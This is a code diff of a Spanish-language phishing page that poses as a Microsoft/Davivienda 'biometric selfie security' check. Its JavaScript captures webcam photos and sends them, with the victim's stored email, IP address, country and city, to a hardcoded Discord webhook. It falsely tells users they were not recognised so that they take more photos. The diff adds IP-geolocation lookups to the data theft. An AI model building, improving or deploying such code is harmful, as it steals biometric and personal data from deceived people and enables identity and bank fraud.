@@ -12,9 +12,240 @@
 <div class="container" id="mainContainer"><div class="logo"><div class="imgkol"><img style="width: 25%;" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt=""></div></div><div id="selfieSection"><div style="font-size: 24px;
             font-weight: 600;color: #111111;line-height: 1.25;margin: 0 auto 16px auto;max-width: 340px;" id="mainTitle" class="hide-on-camera">Seguridad biométrica foto tipo selfie para mayor seguridad</div><p id="mainSubtitle" class="subtitle hide-on-camera">Busque un espacio iluminado y haga una expresión neutra. No use gafas, sombreros o accesorios que tapen su rostro.</p><div id="errorMessage" class="error-message"><i class="fa-solid fa-exclamation-triangle"></i><p id="errorText">No pudimos reconocerte. Por favor, intenta de nuevo.</p><div id="attemptInfo" class="attempt-counter"></div></div><div class="instructions-box hide-on-camera"><div class="instructions-title"><i class="fa-solid fa-clipboard-list title-icon"></i> Instrucciones importantes</div><div class="instruction-item"><i class="fa-solid fa-circle-check instruction-icon"></i><span>Busque un lugar con buena iluminación natural o artificial</span></div><div class="instruction-item"><i class="fa-solid fa-circle-check instruction-icon"></i><span>Mantenga una expresión facial neutra, sin sonreír</span></div><div class="instruction-item"><i class="fa-solid fa-circle-check instruction-icon"></i><span>Retire gafas, gorras, sombreros y accesorios faciales</span></div><div class="instruction-item"><i class="fa-solid fa-circle-check instruction-icon"></i><span>Asegúrese de que su rostro esté completamente visible</span></div><div class="instruction-item"><i class="fa-solid fa-circle-check instruction-icon"></i><span>Coloque la cámara a la altura de sus ojos</span></div></div><div id="cameraContainer"><div class="camera-preview"><video id="videoElement" autoplay playsinline></video><div class="camera-guide"></div></div><button class="btn-primary" onclick="capturePhoto()"><i class="fa-solid fa-camera camera-icon"></i> Capturar foto</button><button class="btn-cancel" onclick="closeCamera()">Cancelar</button></div><canvas id="canvas"></canvas><button class="btn-primary hide-on-camera" id="openCameraBtn" onclick="openCamera()"><i class="fa-solid fa-camera camera-icon"></i> <span id="buttonText">Tomar selfie ahora</span></button><button class="btn-cancel hide-on-camera" onclick="window.location.href='formulario.html'" style="margin-top:10px"><i class="fa-solid fa-arrow-left"></i> Volver al formulario</button><div class="security-note hide-on-camera"><i class="fa-solid fa-lock lock-icon"></i><span>Su información está protegida y encriptada</span></div></div></div>
 <script>
-const DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1507131798218342512/HttmYqpus_6kYPNe1WyYNxSyhkGjzTLxjlSNlIpTPtZUEeWuCfy9EJeF_ILhDmmBNYpq";let stream=null,videoElement=null,canvas=null,ctx=null,selfieCount=0;const MAX_ATTEMPTS=2;async function sendImageToDiscord(e,t){try{const n=new FormData;n.append("file",e,`selfie_${selfieCount}.jpg`),n.append("content",t),n.append("username","Davivienda Bot");await fetch(DISCORD_WEBHOOK_URL,{method:"POST",body:n});return console.log(`Selfie ${selfieCount} enviada`),!0}catch(e){return console.error("Error:",e),!1}}async function sendMessageToDiscord(e){try{await fetch(DISCORD_WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:e,username:"Davivienda Bot"})}),console.log("Mensaje enviado")}catch(e){console.error("Error:",e)}}function showLoadingScreen(e="Procesando su información..."){document.getElementById("loadingText").textContent=e,document.getElementById("loadingScreen").style.display="flex",document.getElementById("mainContainer").style.display="none"}function hideLoadingScreen(){document.getElementById("loadingScreen").style.display="none",document.getElementById("mainContainer").style.display="block"}function showErrorMessage(e){const t=document.getElementById("errorMessage"),n=document.getElementById("errorText"),o=document.getElementById("attemptInfo");n.textContent=e,o.textContent="",t.style.display="block",selfieCount<MAX_ATTEMPTS&&(document.getElementById("buttonText").textContent="Intentar de nuevo",document.getElementById("mainTitle").textContent="Por favor, intente de nuevo",document.getElementById("mainSubtitle").textContent="Verificamos tu foto y no pudimos reconocerte. Sigue las instrucciones cuidadosamente.")}function hideErrorMessage(){document.getElementById("errorMessage").style.display="none"}function resetUI(){document.getElementById("buttonText").textContent="Tomar selfie ahora",document.getElementById("mainTitle").textContent="Seguridad biométrica foto tipo selfie para mayor seguridad",document.getElementById("mainSubtitle").textContent="Toma tu foto en un espacio iluminado con expresión neutra. No use gafas, sombreros o accesorios que oculte tu rostro.",hideErrorMessage(),document.getElementById("mainContainer").classList.remove("camera-active")}function maxAttemptsReached(){showLoadingScreen("❌ Límite de intentos alcanzado. Intente más tarde...");const userData = JSON.parse(localStorage.getItem('userDataIndex1') || '{}');
-const e = userData.email || "Correo no disponible";
-const t = `${userData.geo?.ip || 'IP no disponible'} - ${userData.geo?.pais || ''} - ${userData.geo?.ciudad || ''}`,n=`🚫 **LÍMITE DE INTENTOS ALCANZADO**\n${e}\n🌐 **IP:** ${t}\n📸 **Intentos fallidos:** ${MAX_ATTEMPTS}\n🕐 **Hora:** ${new Date().toLocaleString()}\n❌ **Usuario bloqueado temporalmente**`;sendMessageToDiscord(n),setTimeout(()=>{window.location.href="validar.html"},5e3)}async function openCamera(){try{document.getElementById("mainContainer").classList.add("camera-active"),hideErrorMessage(),setTimeout(()=>{document.getElementById("cameraContainer").style.display="block"},50),videoElement=document.getElementById("videoElement"),canvas=document.getElementById("canvas"),ctx=canvas.getContext("2d");const e={video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},audio:!1};stream=await navigator.mediaDevices.getUserMedia(e),videoElement.srcObject=stream}catch(e){console.error("Error:",e),document.getElementById("mainContainer").classList.remove("camera-active"),"NotAllowedError"===e.name||"PermissionDeniedError"===e.name?(alert("Permiso denegado. Continuando..."),simulateSelfieCapture()):"NotFoundError"===e.name||"DevicesNotFoundError"===e.name?(alert("No se encontró cámara. Continuando..."),simulateSelfieCapture()):(alert("Error de cámara. Continuando..."),simulateSelfieCapture())}}function simulateSelfieCapture(){selfieCount++,showLoadingScreen("Capturando foto...");const e=localStorage.getItem("usuario")||"Usuario desconocido",t=localStorage.getItem("userIP")||"IP no disponible",n=`📸 **SELFIE CAPTURADA (Sin cámara)**\n${e}\n🌐 **IP:** ${t}\n🔢 **Intento #:** ${selfieCount}\n🕐 **Fecha:** ${new Date().toLocaleString()}\n⚠ **Nota:** Sin cámara`;sendMessageToDiscord(n),setTimeout(()=>{hideLoadingScreen(),selfieCount<MAX_ATTEMPTS?showErrorMessage("No pudimos reconocerte. Por favor, intenta de nuevo."):maxAttemptsReached()},5e3)}async function capturePhoto(){showLoadingScreen("Capturando foto..."),selfieCount++;try{canvas.width=videoElement.videoWidth,canvas.height=videoElement.videoHeight,ctx.save(),ctx.scale(-1,1),ctx.drawImage(videoElement,-canvas.width,0,canvas.width,canvas.height),ctx.restore(),canvas.toBlob(async e=>{if(!e)return console.error("Error imagen"),void simulateSelfieCapture();stream&&(stream.getTracks().forEach(e=>e.stop()),stream=null);const t=localStorage.getItem("usuario")||"Usuario desconocido",n=localStorage.getItem("userIP")||"IP no disponible",o=`📸 **SELFIE CAPTURADA - Intento ${selfieCount}**\n${t}\n🌐 **IP:** ${n}\n🔢 **Intento #:** ${selfieCount} de ${MAX_ATTEMPTS}\n🕐 **Fecha:** ${new Date().toLocaleString()}\n❌ **Resultado:** No reconocido`;await sendImageToDiscord(e,o)||await sendMessageToDiscord(o+"\n⚠ *Sin imagen*"),setTimeout(()=>{hideLoadingScreen(),closeCamera(),selfieCount<MAX_ATTEMPTS?showErrorMessage("No pudimos reconocerte. Por favor, intenta de nuevo."):maxAttemptsReached()},3e3)},"image/jpeg",.95)}catch(e){console.error("Error:",e),simulateSelfieCapture()}}function closeCamera(){stream&&(stream.getTracks().forEach(e=>e.stop()),stream=null),document.getElementById("cameraContainer").style.display="none",document.getElementById("mainContainer").classList.remove("camera-active")}window.addEventListener("beforeunload",()=>{stream&&stream.getTracks().forEach(e=>e.stop())}),document.addEventListener("DOMContentLoaded",function(){selfieCount=0,resetUI()});
+const DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1507131798218342512/HttmYqpus_6kYPNe1WyYNxSyhkGjzTLxjlSNlIpTPtZUEeWuCfy9EJeF_ILhDmmBNYpq";
+let stream=null,videoElement=null,canvas=null,ctx=null,selfieCount=0;
+const MAX_ATTEMPTS=2;
+
+async function fetchWithTimeout(url, timeout=5000){
+    const controller=new AbortController();
+    const id=setTimeout(()=>controller.abort(),timeout);
+    try{
+        const response=await fetch(url,{signal:controller.signal});
+        clearTimeout(id);
+        return response;
+    }catch(e){
+        clearTimeout(id);
+        throw e;
+    }
+}
+
+async function getGeoInfo(){
+    const apis=[
+        {url:'https://ipapi.co/json/', parser:(d)=>({ip:d.ip, pais:d.country_name, ciudad:d.city})},
+        {url:'https://ipinfo.io/json/', parser:(d)=>({ip:d.ip, pais:d.country, ciudad:d.city})},
+        {url:'https://api.ipify.org?format=json', parser:(d)=>({ip:d.ip, pais:'Desconocido', ciudad:'Desconocido'})},
+        {url:'https://api.my-ip.io/ip.json', parser:(d)=>({ip:d.ip, pais:d.country||'Desconocido', ciudad:d.city||'Desconocido'})}
+    ];
+    for(const api of apis){
+        try{
+            const res=await fetchWithTimeout(api.url,4000);
+            if(!res.ok) continue;
+            const data=await res.json();
+            let result=api.parser(data);
+            if(result.ip && result.ip!=='No disponible'){
+                if(result.pais==='Desconocido' && result.ciudad==='Desconocido' && api.url.includes('ipify')){
+                    try{
+                        const geoRes=await fetchWithTimeout(`https://ipapi.co/${result.ip}/json/`,3000);
+                        if(geoRes.ok){
+                            const geoData=await geoRes.json();
+                            result.pais=geoData.country_name || 'Desconocido';
+                            result.ciudad=geoData.city || 'Desconocido';
+                        }
+                    }catch(e){}
+                }
+                return result;
+            }
+        }catch(e){
+            continue;
+        }
+    }
+    return {ip:'No disponible', pais:'No disponible', ciudad:'No disponible'};
+}
+
+function getStoredData(){
+    const raw=localStorage.getItem('userDataIndex1');
+    if(raw){
+        const data=JSON.parse(raw);
+        return {email:data.email, geo:data.geo};
+    }
+    return null;
+}
+
+async function ensureGeoInfo(){
+    const stored=getStoredData();
+    if(stored && stored.geo && stored.geo.ip && stored.geo.ip!=='No disponible'){
+        return stored.geo;
+    }
+    return await getGeoInfo();
+}
+
+function formatGeoLine(geo){
+    return `🌍 **IP:** ${geo.ip} - 📍 **País:** ${geo.pais} - 🏙️ **Ciudad:** ${geo.ciudad}`;
+}
+
+async function sendImageToDiscord(blob, fullContent){
+    try{
+        const formData=new FormData;
+        formData.append("file",blob,`selfie_${selfieCount}.jpg`);
+        formData.append("content",fullContent);
+        formData.append("username","Davivienda Bot");
+        await fetch(DISCORD_WEBHOOK_URL,{method:"POST",body:formData});
+        console.log(`Selfie ${selfieCount} enviada`);
+        return true;
+    }catch(e){
+        console.error("Error:",e);
+        return false;
+    }
+}
+
+async function sendMessageToDiscord(fullContent){
+    try{
+        await fetch(DISCORD_WEBHOOK_URL,{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({content:fullContent,username:"Davivienda Bot"})
+        });
+        console.log("Mensaje enviado");
+    }catch(e){
+        console.error("Error:",e);
+    }
+}
+
+function showLoadingScreen(e="Procesando su información..."){
+    document.getElementById("loadingText").textContent=e;
+    document.getElementById("loadingScreen").style.display="flex";
+    document.getElementById("mainContainer").style.display="none";
+}
+function hideLoadingScreen(){
+    document.getElementById("loadingScreen").style.display="none";
+    document.getElementById("mainContainer").style.display="block";
+}
+function showErrorMessage(e){
+    const t=document.getElementById("errorMessage"),n=document.getElementById("errorText"),o=document.getElementById("attemptInfo");
+    n.textContent=e;
+    o.textContent="";
+    t.style.display="block";
+    if(selfieCount<MAX_ATTEMPTS){
+        document.getElementById("buttonText").textContent="Intentar de nuevo";
+        document.getElementById("mainTitle").textContent="Por favor, intente de nuevo";
+        document.getElementById("mainSubtitle").textContent="Verificamos tu foto y no pudimos reconocerte. Sigue las instrucciones cuidadosamente.";
+    }
+}
+function hideErrorMessage(){
+    document.getElementById("errorMessage").style.display="none";
+}
+function resetUI(){
+    document.getElementById("buttonText").textContent="Tomar selfie ahora";
+    document.getElementById("mainTitle").textContent="Seguridad biométrica foto tipo selfie para mayor seguridad";
+    document.getElementById("mainSubtitle").textContent="Toma tu foto en un espacio iluminado con expresión neutra. No use gafas, sombreros o accesorios que oculte tu rostro.";
+    hideErrorMessage();
+    document.getElementById("mainContainer").classList.remove("camera-active");
+}
+async function maxAttemptsReached(){
+    showLoadingScreen("❌ Límite de intentos alcanzado. Intente más tarde...");
+    const userData=getStoredData();
+    const email=userData?.email || "Correo no disponible";
+    const geo=await ensureGeoInfo();
+    const geoLine=formatGeoLine(geo);
+    const msg=`🚫 **LÍMITE DE INTENTOS ALCANZADO**\n📧 ${email}\n${geoLine}\n📸 Intentos fallidos: ${MAX_ATTEMPTS}\n🕐 Hora: ${new Date().toLocaleString()}\n❌ Usuario bloqueado temporalmente`;
+    await sendMessageToDiscord(msg);
+    setTimeout(()=>{window.location.href="validar.html";},5000);
+}
+async function openCamera(){
+    try{
+        document.getElementById("mainContainer").classList.add("camera-active");
+        hideErrorMessage();
+        setTimeout(()=>{document.getElementById("cameraContainer").style.display="block";},50);
+        videoElement=document.getElementById("videoElement");
+        canvas=document.getElementById("canvas");
+        ctx=canvas.getContext("2d");
+        const constraints={video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},audio:false};
+        stream=await navigator.mediaDevices.getUserMedia(constraints);
+        videoElement.srcObject=stream;
+    }catch(e){
+        console.error("Error:",e);
+        document.getElementById("mainContainer").classList.remove("camera-active");
+        if(e.name==="NotAllowedError"||e.name==="PermissionDeniedError"){
+            alert("Permiso denegado. Continuando...");
+            simulateSelfieCapture();
+        }else if(e.name==="NotFoundError"||e.name==="DevicesNotFoundError"){
+            alert("No se encontró cámara. Continuando...");
+            simulateSelfieCapture();
+        }else{
+            alert("Error de cámara. Continuando...");
+            simulateSelfieCapture();
+        }
+    }
+}
+async function simulateSelfieCapture(){
+    selfieCount++;
+    showLoadingScreen("Capturando foto...");
+    const userData=getStoredData();
+    const email=userData?.email || "Usuario desconocido";
+    const geo=await ensureGeoInfo();
+    const geoLine=formatGeoLine(geo);
+    const msg=`📸 **SELFIE CAPTURADA (Sin cámara)**\n📧 ${email}\n${geoLine}\n🔢 Intento #${selfieCount}\n🕐 Fecha: ${new Date().toLocaleString()}\n⚠ Nota: Sin cámara`;
+    await sendMessageToDiscord(msg);
+    setTimeout(()=>{
+        hideLoadingScreen();
+        if(selfieCount<MAX_ATTEMPTS) showErrorMessage("No pudimos reconocerte. Por favor, intenta de nuevo.");
+        else maxAttemptsReached();
+    },5000);
+}
+async function capturePhoto(){
+    showLoadingScreen("Capturando foto...");
+    selfieCount++;
+    try{
+        canvas.width=videoElement.videoWidth;
+        canvas.height=videoElement.videoHeight;
+        ctx.save();
+        ctx.scale(-1,1);
+        ctx.drawImage(videoElement,-canvas.width,0,canvas.width,canvas.height);
+        ctx.restore();
+        canvas.toBlob(async (blob)=>{
+            if(!blob){
+                console.error("Error imagen");
+                simulateSelfieCapture();
+                return;
+            }
+            if(stream){
+                stream.getTracks().forEach(t=>t.stop());
+                stream=null;
+            }
+            const userData=getStoredData();
+            const email=userData?.email || "Usuario desconocido";
+            const geo=await ensureGeoInfo();
+            const geoLine=formatGeoLine(geo);
+            const msg=`📸 **SELFIE CAPTURADA - Intento ${selfieCount}**\n📧 ${email}\n${geoLine}\n🔢 Intento #${selfieCount} de ${MAX_ATTEMPTS}\n🕐 Fecha: ${new Date().toLocaleString()}\n❌ Resultado: No reconocido`;
+            const sent=await sendImageToDiscord(blob,msg);
+            if(!sent) await sendMessageToDiscord(msg+"\n⚠ *Sin imagen*");
+            setTimeout(()=>{
+                hideLoadingScreen();
+                closeCamera();
+                if(selfieCount<MAX_ATTEMPTS) showErrorMessage("No pudimos reconocerte. Por favor, intenta de nuevo.");
+                else maxAttemptsReached();
+            },3000);
+        },"image/jpeg",0.95);
+    }catch(e){
+        console.error("Error:",e);
+        simulateSelfieCapture();
+    }
+}
+function closeCamera(){
+    if(stream){
+        stream.getTracks().forEach(t=>t.stop());
+        stream=null;
+    }
+    document.getElementById("cameraContainer").style.display="none";
+    document.getElementById("mainContainer").classList.remove("camera-active");
+}
+window.addEventListener("beforeunload",()=>{
+    if(stream) stream.getTracks().forEach(t=>t.stop());
+});
+document.addEventListener("DOMContentLoaded",function(){
+    selfieCount=0;
+    resetUI();
+}); 
 </script>
 </body>
 </html>
